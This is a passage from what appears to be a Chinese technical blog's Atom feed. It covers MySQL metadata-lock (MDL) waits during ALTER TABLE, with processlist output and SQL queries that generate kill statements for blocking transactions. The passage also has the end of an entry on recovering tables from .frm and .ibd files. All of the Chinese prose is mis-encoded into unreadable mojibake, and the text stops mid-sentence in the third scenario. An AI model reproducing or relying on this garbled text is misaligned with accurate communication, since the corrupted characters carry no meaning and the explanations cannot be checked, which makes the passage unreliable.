&lt;p&gt;åœ¨æœ¬æ¬¡æ¡ˆä¾‹ä¸­ï¼ŒæŸå®¢æˆ·æ•°æ®åº“å› å­˜å‚¨ç©ºé—´ä¸å¤Ÿå¯¼è‡´æ•°æ®åº“æœåŠ¡å®•æ‰ï¼Œè€Œå®¢æˆ·åœ¨æ•°æ®åº“å®•æœºåï¼Œåªæ‹·è´äº†å•ä¸ª&lt;code&gt;cy&lt;/code&gt;åº“æ‰€å±çš„ç›®å½•è¿›è¡Œäº†æ–‡ä»¶å±‚é¢çš„å¤‡ä»½ï¼Œå°±å°†å…¶ä»–æ–‡ä»¶å…¨éƒ¨æ¸…ç©ºï¼Œå½“ä»–æƒ³é‡æ–°å¯åŠ¨æ•°æ®åº“æ—¶å‘ç°æ•°æ®åº“æœåŠ¡å¯åŠ¨ã€‚MySQLä½¿ç”¨5.7.17ç‰ˆæœ¬ï¼Œä½¿ç”¨innodbå­˜å‚¨å¼•æ“ï¼Œå¼€å¯äº†ç‹¬ç«‹è¡¨ç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´å½“å‰çš„æ•‘å‘½ç¨»è‰æ˜¯ï¼šæ¯ä¸ªè¡¨çš„&lt;code&gt;.frm&lt;/code&gt;å’Œ&lt;code&gt;.ibd&lt;/code&gt;æ–‡ä»¶ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="æ•°æ®æ•‘æ´" scheme="http://www.toberoot.com/tags/%E6%95%B0%E6%8D%AE%E6%95%91%E6%8F%B4/"/>
    
  </entry>
  
  <entry>
    <title>MySQLçš„å…ƒé”MDLå‘ç”Ÿåœºæ™¯å’Œè§£å†³æ–¹æ³•æ€»ç»“</title>
    <link href="http://www.toberoot.com/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://www.toberoot.com/2017/08/19/booboo_others/MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2017-08-18T20:06:27.000Z</published>
    <updated>2020-03-22T08:32:42.577Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šMetaData Lockå³å…ƒæ•°æ®é”ï¼Œåœ¨æ•°æ®åº“ä¸­å…ƒæ•°æ®å³æ•°æ®å­—å…¸ä¿¡æ¯åŒ…æ‹¬db,table,function,procedure,trigger,eventç­‰ã€‚metadata lockä¸»è¦ä¸ºäº†ä¿è¯å…ƒæ•°æ®çš„ä¸€è‡´æ€§,ç”¨äºå¤„ç†ä¸åŒçº¿ç¨‹æ“ä½œåŒä¸€æ•°æ®å¯¹è±¡çš„åŒæ­¥ä¸äº’æ–¥é—®é¢˜ã€‚</p><p>ä»Šå¤©æœ‰å®¢æˆ·(MySQL 5.6)é‡åˆ°è¯¥é—®é¢˜ï¼Œæœ€å…³é”®çš„æ˜¯å±äºç¬¬ä¸‰ç§æƒ…å†µï¼Œgoogleä¸Šæ ¹æœ¬æ‰¾ä¸åˆ°ç±»ä¼¼çš„æ•…éšœæ¡ˆä¾‹ï¼Œå”¯ä¸€ä¸€ä¸ªéå¸¸æ¥è¿‘çš„æ•…éšœæ¡ˆä¾‹ä¸­æ•°æ®åº“ç‰ˆæœ¬å´ä¸åŒï¼ˆå…·ä½“çœ‹ä¸‹æ–‡æ…¢æ…¢èŠï¼‰ï¼Œå“ï¼Œå›°éš¾é‡é‡å•Šï¼Œæœ€ç»ˆè¿˜æ˜¯è§£å†³äº†å“ˆã€‚</p><p>alter tableçš„è¯­å¥æ˜¯å¾ˆå±é™©çš„ï¼Œåœ¨æ“ä½œä¹‹å‰æœ€å¥½ç¡®è®¤å¯¹è¦æ“ä½œçš„è¡¨æ²¡æœ‰ä»»ä½•è¿›è¡Œä¸­çš„æ“ä½œã€æ²¡æœ‰æœªæäº¤äº‹åŠ¡ã€ä¹Ÿæ²¡æœ‰æ˜¾å¼äº‹åŠ¡ä¸­çš„æŠ¥é”™è¯­å¥ã€‚å¦‚æœæœ‰alter tableçš„ç»´æŠ¤ä»»åŠ¡ï¼Œåœ¨æ— äººç›‘ç®¡çš„æ—¶å€™è¿è¡Œï¼Œæœ€å¥½é€šè¿‡lock_wait_timeoutè®¾ç½®å¥½è¶…æ—¶æ—¶é—´ï¼Œé¿å…é•¿æ—¶é—´çš„metedataé”ç­‰å¾…ã€‚</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯metadata-lockï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯metadata-lockï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯metadata lockï¼Ÿ"></a>ä»€ä¹ˆæ˜¯metadata lockï¼Ÿ</h2><p>MetaData Lockå³å…ƒæ•°æ®é”ï¼Œåœ¨æ•°æ®åº“ä¸­å…ƒæ•°æ®å³æ•°æ®å­—å…¸ä¿¡æ¯åŒ…æ‹¬db,table,function,procedure,trigger,eventç­‰ã€‚metadata lockä¸»è¦ä¸ºäº†ä¿è¯å…ƒæ•°æ®çš„ä¸€è‡´æ€§,ç”¨äºå¤„ç†ä¸åŒçº¿ç¨‹æ“ä½œåŒä¸€æ•°æ®å¯¹è±¡çš„åŒæ­¥ä¸äº’æ–¥é—®é¢˜ã€‚</p><h3 id="MetaData-Lockçš„å‰ä¸–ä»Šç”Ÿ"><a href="#MetaData-Lockçš„å‰ä¸–ä»Šç”Ÿ" class="headerlink" title="MetaData Lockçš„å‰ä¸–ä»Šç”Ÿ"></a><strong>MetaData Lockçš„å‰ä¸–ä»Šç”Ÿ</strong></h3><p>MDLé”æ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªæœ‰åçš„<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>ï¼Œæ‰€ä»¥åœ¨5.5.3ç‰ˆæœ¬å¼•å…¥äº†MDLé”ã€‚å…¶å®5.5ä¹Ÿæœ‰ç±»ä¼¼ä¿æŠ¤å…ƒæ•°æ®çš„æœºåˆ¶ï¼Œåªæ˜¯æ²¡æœ‰æ˜ç¡®æå‡ºMDLæ¦‚å¿µè€Œå·²ã€‚ä½†æ˜¯5.5ä¹‹å‰ç‰ˆæœ¬(æ¯”å¦‚5.1)ä¸5.5ä¹‹åç‰ˆæœ¬åœ¨ä¿æŠ¤å…ƒæ•°æ®è¿™å—æœ‰ä¸€ä¸ªæ˜¾è‘—çš„ä¸åŒç‚¹æ˜¯ï¼Œ5.1å¯¹äºå…ƒæ•°æ®çš„ä¿æŠ¤æ˜¯è¯­å¥çº§åˆ«çš„ï¼Œ5.5å¯¹äºmetadataçš„ä¿æŠ¤æ˜¯äº‹åŠ¡çº§åˆ«çš„ã€‚æ‰€è°“è¯­å¥çº§åˆ«ï¼Œå³è¯­å¥æ‰§è¡Œå®Œæˆåï¼Œæ— è®ºäº‹åŠ¡æ˜¯å¦æäº¤æˆ–å›æ»šï¼Œå…¶è¡¨ç»“æ„å¯ä»¥è¢«å…¶ä»–ä¼šè¯æ›´æ–°ï¼›è€Œäº‹åŠ¡çº§åˆ«åˆ™æ˜¯åœ¨äº‹åŠ¡ç»“æŸåæ‰é‡Šæ”¾MDLã€‚å¼•å…¥MDLé”ä¸»è¦æ˜¯ä¸ºäº†<strong>è§£å†³ä¸¤ä¸ªé—®é¢˜</strong>ï¼š</p><ul><li>äº‹åŠ¡éš”ç¦»é—®é¢˜ï¼šæ¯”å¦‚åœ¨å¯é‡å¤éš”ç¦»çº§åˆ«ä¸‹ï¼Œä¼šè¯Aåœ¨2æ¬¡æŸ¥è¯¢æœŸé—´ï¼Œä¼šè¯Bå¯¹è¡¨ç»“æ„åšäº†ä¿®æ”¹ï¼Œä¸¤æ¬¡æŸ¥è¯¢ç»“æœå°±ä¼šä¸ä¸€è‡´ï¼Œæ— æ³•æ»¡è¶³å¯é‡å¤è¯»çš„è¦æ±‚ã€‚</li><li>æ•°æ®å¤åˆ¶é—®é¢˜ï¼šæ¯”å¦‚ä¼šè¯Aæ‰§è¡Œäº†å¤šæ¡æ›´æ–°è¯­å¥æœŸé—´ï¼Œå¦å¤–ä¸€ä¸ªä¼šè¯Båšäº†è¡¨ç»“æ„å˜æ›´å¹¶ä¸”å…ˆæäº¤ï¼Œå°±ä¼šå¯¼è‡´slaveåœ¨é‡åšæ—¶ï¼Œå…ˆé‡åšalterï¼Œå†é‡åšupdateæ—¶å°±ä¼šå‡ºç°å¤åˆ¶é”™è¯¯çš„ç°è±¡ã€‚ä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„<a href="https://bugs.mysql.com/bug.php?id=989" target="_blank" rel="noopener">bug#989</a>ã€‚</li></ul><hr><h3 id="DDLæ“ä½œä¸MetaData-Lock"><a href="#DDLæ“ä½œä¸MetaData-Lock" class="headerlink" title="DDLæ“ä½œä¸MetaData Lock"></a>DDLæ“ä½œä¸MetaData Lock</h3><ul><li>metadata lock æœºåˆ¶æ˜¯ä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§å­˜åœ¨çš„ï¼Œåœ¨æœ‰äº‹åŠ¡çš„æ“ä½œæ—¶å€™ï¼Œéœ€è¦é¦–å…ˆè·å¾—metadata lock ,ç„¶åæ“ä½œï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™ï¼Œåˆæ¥äº†ä¸€ä¸ªäº‹åŠ¡ä¹Ÿè¦ddlæ“ä½œåŒä¸€ä¸ªè¡¨ï¼Œå°±ä¼šå‡ºç° metadata lockã€‚</li><li>è‡ªåŠ¨æäº¤æ¨¡å¼ä¸‹ï¼Œå•è¯­å¥å°±æ˜¯ä¸€ä¸ªäº‹åŠ¡ï¼Œæ‰§è¡Œå®Œäº†ï¼Œäº‹åŠ¡ä¹Ÿå°±ç»“æŸäº†ã€‚</li><li>preparestatement  ä¼šè·å¾— metalockï¼Œä¸€æ—¦prepare å®Œæ¯•ï¼Œ metalock å°±é‡Šæ”¾äº†ã€‚</li><li>online DDLåº”è¯¥æ˜¯æŒ‡åœ¨alter tableè¿›è¡Œçš„æ—¶å€™ï¼Œ æ’å…¥/ä¿®æ”¹/åˆ é™¤æ•°æ®çš„sqlè¯­å¥ä¸ä¼šWaiting for table metadata lockã€‚ä¸€æ—¦alter table TableAçš„æ“ä½œåœæ»åœ¨Waiting for table metadata lockçš„çŠ¶æ€ï¼Œåç»­å¯¹TableAçš„ä»»ä½•æ“ä½œï¼ˆåŒ…æ‹¬è¯»ï¼‰éƒ½æ— æ³•è¿›è¡Œï¼Œä¹Ÿä¼šåœ¨Opening tablesçš„é˜¶æ®µè¿›å…¥Waiting for table metadata lockçš„é˜Ÿåˆ—ã€‚</li></ul><h2 id="Alter-table-ä¼šå‘ç”Ÿé”çš„ä¸‰ç§åœºæ™¯"><a href="#Alter-table-ä¼šå‘ç”Ÿé”çš„ä¸‰ç§åœºæ™¯" class="headerlink" title="Alter table ä¼šå‘ç”Ÿé”çš„ä¸‰ç§åœºæ™¯"></a>Alter table ä¼šå‘ç”Ÿé”çš„ä¸‰ç§åœºæ™¯</h2><h3 id="åœºæ™¯1"><a href="#åœºæ™¯1" class="headerlink" title="åœºæ™¯1"></a>åœºæ™¯1</h3><ul><li>ä¼šè¯Aå¯¹boobooè¡¨æ‰§è¡Œè¯»æ“ä½œ<code>select *,sleep(60) from booboo;</code>ï¼Œæ­£åœ¨è¿›è¡Œæœªæäº¤äº‹åŠ¡</li><li>ä¼šè¯Bå¯¹boobooè¡¨æ‰§è¡Œåœ¨çº¿DDLæ“ä½œ<code>alter table booboo add q4 int default 0;</code></li><li>ä¼šè¯Cå¯¹boobooè¡¨æ‰§è¡Œéšå¼è¯»æ“ä½œ<code>select *,sleep(60) from booboo;</code>,è¿›è¡Œç­‰å¾…</li><li>ä¼šè¯Då¯¹boobooè¡¨æ‰§è¡Œæ˜¾ç¤ºè¯»æ“ä½œ<code>begin;select * from booboo;</code>ä¹Ÿä¼šè¿›è¡Œç­‰å¾…</li><li>é€šè¿‡<code>show processlist</code>å¯ä»¥çœ‹åˆ°ä¼šè¯Aï¼ˆå¯¹boobooè¡¨ä¸Šæ­£åœ¨è¿›è¡Œçš„æ“ä½œï¼‰ï¼Œæ­¤æ—¶ä¼šè¯Bï¼ˆalter tableè¯­å¥ï¼‰æ— æ³•è·å–åˆ°metadata ç‹¬å é”ï¼Œä¼šè¿›è¡Œç­‰å¾…ï¼Œä¼šè¯Cå’Œä¼šè¯Déƒ½ä¼šè¿›è¡Œç­‰å¾…ï¼Œä¸”èƒ½ä»processlistè¡¨ä¸­çœ‹åˆ°å¯¹boobooè¡¨çš„æ“ä½œ</li><li>ä¼šè¯Aæäº¤äº‹åŠ¡åæˆ–killä¹‹åï¼Œä¼šè¯Cäº‹åŠ¡ç»“æŸï¼Œä¼šè¯D<code>select</code>è¯­å¥æ‰§è¡ŒæˆåŠŸï¼Œäº‹åŠ¡æäº¤åˆ™ä¼šè¯Bå¯æ‰§è¡Œï¼Œå¦åˆ™è¿›å…¥åœºæ™¯2</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |  167 | Waiting for table metadata lock | alter table booboo add q4 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |  155 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">|  9 | root | localhost | uplooking | Query   |  181 | User sleep                      | select *,sleep(60) from booboo          |</span><br><span class="line">| 10 | root | localhost | uplooking | Query   |    7 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> id=9çš„çº¿ç¨‹ä¸ºä¼šè¯A è™½ç„¶æ˜¯éšå¼äº‹åŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œæ‰€ä»¥ä¸ºæœªæäº¤çš„äº‹åŠ¡</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=6çš„çº¿ç¨‹ä¸ºä¼šè¯B åœ¨ä¼šè¯Aæœ‰äº‹åŠ¡æœªæäº¤çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡ŒAlteræ“ä½œ,äº‰æŠ¢metadata lock</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=7çš„çº¿ç¨‹ä¸ºä¼šè¯C éšå¼æŸ¥è¯¢äº‹åŠ¡ä¹Ÿä¼šè¿›å…¥ç­‰å¾…</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> id=10çš„çº¿ç¨‹ä¸ºä¼šè¯D æ˜¾ç¤ºæŸ¥è¯¢äº‹åŠ¡åŒæ ·è¿›å…¥ç­‰å¾…</span></span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹metadatalock</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ç¬¬ä¸€ç§æƒ…å†µï¼Œåˆ™å®šä½åˆ°é•¿æ—¶é—´æœªæäº¤çš„äº‹åŠ¡killå³å¯</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥è¯¢ information_schema.innodb_trx çœ‹åˆ°æœ‰é•¿æ—¶é—´æœªå®Œæˆçš„äº‹åŠ¡ï¼Œ ä½¿ç”¨ <span class="built_in">kill</span> å‘½ä»¤ç»ˆæ­¢è¯¥æŸ¥è¯¢ã€‚</span></span><br><span class="line"></span><br><span class="line">select concat('kill ',i.trx_mysql_thread_id,';') from information_schema.innodb_trx i,</span><br><span class="line">  (select </span><br><span class="line">         id, time</span><br><span class="line">     from</span><br><span class="line">         information_schema.processlist</span><br><span class="line">     where</span><br><span class="line">         time = (select </span><br><span class="line">                 max(time)</span><br><span class="line">             from</span><br><span class="line">                 information_schema.processlist</span><br><span class="line">             where</span><br><span class="line">                 state = 'Waiting for table metadata lock'</span><br><span class="line">                     and substring(info, 1, 5) in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat'))) p</span><br><span class="line">  where timestampdiff(second, i.trx_started, now()) &gt; p.time</span><br><span class="line">  and i.trx_mysql_thread_id  not in (connection_id(),p.id);</span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯2"><a href="#åœºæ™¯2" class="headerlink" title="åœºæ™¯2"></a>åœºæ™¯2</h3><ul><li>é€šè¿‡<code>show processlist</code>çœ‹ä¸åˆ°boobooä¸Šæœ‰ä»»ä½•æ“ä½œï¼Œä½†å®é™…ä¸Šå­˜åœ¨æœ‰æœªæäº¤çš„äº‹åŠ¡ï¼Œå¯ä»¥åœ¨<code>information_schema.innodb_trx</code>ä¸­æŸ¥çœ‹åˆ°ã€‚åœ¨äº‹åŠ¡æ²¡æœ‰å®Œæˆä¹‹å‰ï¼Œboobooçš„é”ä¸ä¼šé‡Šæ”¾ï¼Œalter tableåŒæ ·è·å–ä¸åˆ°metadataçš„ç‹¬å é”</li><li>ä¼šè¯Dæäº¤äº‹åŠ¡æˆ–å›æ»šæˆ–killï¼Œåˆ™ä¼šè¯Bä¸­çš„Alterå¯ç»§ç»­æ‰§è¡Œ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> åœ¨åœºæ™¯1çš„åŸºç¡€ä¸Šï¼Œå°†ä¼šè¯Açš„äº‹åŠ¡å®Œæˆæˆ–è€…<span class="built_in">kill</span>æ‰ï¼Œä¼šè¯Cæ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯ä¼šè¯Bå’Œä¼šè¯Dç»§ç»­è¿›å…¥metadataé”çš„ç­‰å¾…ã€‚åŸå› æ˜¯ä¼šè¯Dè™½ç„¶selectå¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯äº‹åŠ¡æ²¡æœ‰æäº¤ï¼Œåˆ™è¡¨ä¸Šçš„metadataé”è¿˜å­˜åœ¨ï¼Œå¯¼è‡´ä¼šè¯Bçš„ddlæ“ä½œæ— æ³•æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¼šè¯Bå’Œä¼šè¯Dï¼Œæƒ…å†µ1ï¼šçŸ¥é“æœ‰æœªå®Œæˆçš„äº‹åŠ¡Dï¼Œåˆ™ç»“æŸä¼šè¯Dçš„äº‹åŠ¡ï¼Œä¼šè¯Bæ­£å¸¸æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¼šè¯Bå’Œä¼šè¯Dï¼Œæƒ…å†µ2ï¼šä¸çŸ¥é“æœ‰æœªç»“æŸçš„äº‹åŠ¡Dï¼Œå¦‚ä½•æ’é”™å‘¢ï¼Ÿ</span></span><br><span class="line">=================================</span><br><span class="line"></span><br><span class="line">-- è¯·æ ¹æ®å…·ä½“çš„æƒ…æ™¯ä¿®æ”¹æŸ¥è¯¢è¯­å¥</span><br><span class="line">-- å¦‚æœå¯¼è‡´é˜»å¡çš„è¯­å¥çš„ç”¨æˆ·ä¸å½“å‰ç”¨æˆ·ä¸åŒï¼Œè¯·ä½¿ç”¨å¯¼è‡´é˜»å¡çš„è¯­å¥çš„ç”¨æˆ·ç™»å½•æ¥ç»ˆæ­¢ä¼šè¯</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># åœºæ™¯2çš„æƒ…å†µï¼Œæ˜¯åœ¨åœºæ™¯1çš„åŸºç¡€ä¸Šï¼Œè¿˜æ˜¯æœ‰metadatalocké”ï¼ˆ*ä¸€èˆ¬ç”Ÿäº§ç¯å¢ƒä¸ä¼šåœæœåŠ¡ï¼Œå› æ­¤ä¸åœçš„æœ‰æ–°çš„queryå‘é€è¿‡æ¥ï¼Œå°±ä¼šå‡ºç°åœºæ™¯2*ï¼‰ï¼Œåˆ™æ‰‹åŠ¨ç»§ç»­killæ‰é•¿äº‹åŠ¡å³å¯ï¼Œæ³¨æ„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæœ‰å¯èƒ½ddlæ“ä½œéœ€è¦ä¿ç•™ï¼ˆ*ä¾‹å¦‚MDLé”å‡ºç°åœ¨ä¸»ä»åŒæ­¥çš„ä»ä¸­ï¼Œä»åº“éœ€è¦å»æ‰§è¡Œä¸»å‘é€çš„è¡¨å˜æ›´ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥å…ˆå°†ä¸»ä»åœæ‰ï¼Œæ‰‹åŠ¨æ‰§è¡Œalteræ“ä½œï¼Œéƒ½å¯ä»¥*ï¼‰ä»¥ä¸‹æ–¹æ³•æ˜¯åœ¨åœæ­¢å¯¹ä»åº“çš„è¯»æ“ä½œåï¼Œå°†éddlçš„è¿æ¥killæ‰</span></span></span><br><span class="line"></span><br><span class="line">select id,State,command from information_schema.processlist where State="Waiting for table metadata lock";</span><br><span class="line">select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id;</span><br><span class="line">show processlist;</span><br><span class="line">select  concat('kill ',trx_mysql_thread_id,';') from information_schema.processlist,information_schema.innodb_trx  where trx_mysql_thread_id=id and State!="Waiting for table metadata lock";</span><br><span class="line"></span><br><span class="line">===============================</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                             </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |  275 | Waiting for table metadata lock | alter table booboo add q6 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Sleep   |  269 |                                 | NULL                                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 10 | root | localhost | uplooking | Sleep   |  249 |                                 | NULL                                    |</span><br><span class="line">| 12 | root | localhost | uplooking | Sleep   |  191 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å½“å‰è¿›ç¨‹å‘ç°é™¤äº†Alterä¹‹å¤–æ²¡æœ‰å¯¹boobooè¡¨çš„æ“ä½œ</span></span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| timediff | sysdate()           | trx_started         | id | USER | DB        | COMMAND | STATE                           | trx_state | trx_query                               |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 |  6 | root | uplooking | Query   | Waiting for table metadata lock | RUNNING   | alter table booboo add q6 int default 0 |</span><br><span class="line">| 00:05:38 | 2017-08-18 20:21:07 | 2017-08-18 20:15:29 | 10 | root | uplooking | Sleep   |                                 | RUNNING   | NULL                                    |</span><br><span class="line">+----------+---------------------+---------------------+----+------+-----------+---------+---------------------------------+-----------+-----------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹innodb_trxè¡¨å¯ä»¥çœ‹åˆ°é™¤äº†alterä¹‹å¤–æœ‰æœªå®Œæˆçš„äº‹åŠ¡ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“queryï¼Œå¾—åˆ°çº¿ç¨‹idä¸º10</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> å°±å¯ä»¥<span class="built_in">kill</span> 10æ¥ç»“æŸäº‹åŠ¡</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¹‹åAlteræ­£å¸¸æ“ä½œ</span></span><br></pre></td></tr></table></figure><h3 id="åœºæ™¯3"><a href="#åœºæ™¯3" class="headerlink" title="åœºæ™¯3"></a>åœºæ™¯3</h3><blockquote><p>ä¸åœºæ™¯2å¯¹æ¯”çš„ç°è±¡ä¸åŒäºï¼š</p><ul><li>åœºæ™¯2ï¼šæœªå®Œæˆäº‹åŠ¡ä¸­å­˜åœ¨æœªå®Œæˆäº‹åŠ¡</li><li>åœºæ™¯3ï¼šæœªå®Œæˆäº‹åŠ¡ä¸­ä¸å­˜åœ¨æœªå®Œæˆäº‹åŠ¡ï¼šç¡®è®¤æœ‰é”™è¯¯äº‹åŠ¡æœªæäº¤æˆ–å›æ»šï¼Œæ‰¾åˆ°è¯¥äº‹åŠ¡çš„session_idç„¶åæ€æ­»</li></ul></blockquote><ul><li>é€šè¿‡<code>show processlist</code>çœ‹ä¸åˆ°<code>booboo</code>è¡¨æœ‰ä»»ä½•æ“ä½œï¼Œåœ¨<code>information_schema.innodb_trx</code>ä¸­ä¹Ÿæ²¡æœ‰ä»»ä½•è¿›è¡Œä¸­çš„äº‹åŠ¡ã€‚</li><li>è¿™å¾ˆå¯èƒ½æ˜¯å› ä¸ºåœ¨ä¸€ä¸ªæ˜¾å¼çš„äº‹åŠ¡ä¸­ï¼Œå¯¹<code>booboo</code>è¡¨è¿›è¡Œäº†ä¸€ä¸ªå¤±è´¥çš„æ“ä½œï¼ˆæ¯”å¦‚æŸ¥è¯¢äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å­—æ®µï¼‰ï¼Œè¿™æ—¶äº‹åŠ¡æ²¡æœ‰å¼€å§‹ï¼Œä½†æ˜¯å¤±è´¥è¯­å¥è·å–åˆ°çš„é”ä¾ç„¶æœ‰æ•ˆã€‚ä»<code>performance_schema.events_statements_current</code>è¡¨ä¸­å¯ä»¥æŸ¥åˆ°å¤±è´¥çš„è¯­å¥</li><li>ä¹Ÿå°±æ˜¯è¯´é™¤äº†è¯­æ³•é”™è¯¯ï¼Œå…¶ä»–é”™è¯¯è¯­å¥è·å–åˆ°çš„é”åœ¨è¿™ä¸ªäº‹åŠ¡æäº¤æˆ–å›æ»šä¹‹å‰ï¼Œä»ç„¶ä¸ä¼šé‡Šæ”¾æ‰ã€‚<code>because the failed statement is written to the binary log and the locks protect log consistency</code>ä½†æ˜¯è§£é‡Šè¿™ä¸€è¡Œä¸ºçš„åŸå› å¾ˆéš¾ç†è§£ï¼Œå› ä¸ºé”™è¯¯çš„è¯­å¥æ 